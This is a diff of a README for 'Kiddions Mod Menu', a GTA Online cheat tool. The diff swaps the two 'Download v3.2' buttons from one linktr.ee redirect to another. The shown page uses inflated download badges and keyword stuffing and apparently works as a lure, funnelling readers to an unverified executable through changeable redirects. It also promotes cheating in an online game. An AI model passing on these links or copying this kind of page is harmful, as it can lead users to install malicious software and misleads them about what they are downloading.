@@ -5,7 +5,7 @@ Kiddions Mod Menu (also known as Modest Menu) is a lightweight external mod menu
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v3.2-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-17M%2B-orange?style=flat-square)
 
-[![Download](https://img.shields.io/badge/Download-v3.2-brightgreen?style=for-the-badge)](https://linktr.ee/gitsave)
+[![Download](https://img.shields.io/badge/Download-v3.2-brightgreen?style=for-the-badge)](https://linktr.ee/hauhauhau)
 
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/1e80a8e2-5fe2-45ba-be9a-f82126049663" />
 
@@ -84,4 +84,4 @@ kiddions mod menu, kiddions gta 5, kiddions gta online, kiddions mod menu gta on
 If this repository helped you, please give it a star ⭐  
 Your support helps keep the documentation updated.
 
-[![Download](https://img.shields.io/badge/Download-v3.2-brightgreen?style=for-the-badge)](https://linktr.ee/gitsave)
+[![Download](https://img.shields.io/badge/Download-v3.2-brightgreen?style=for-the-badge)](https://linktr.ee/hauhauhau)
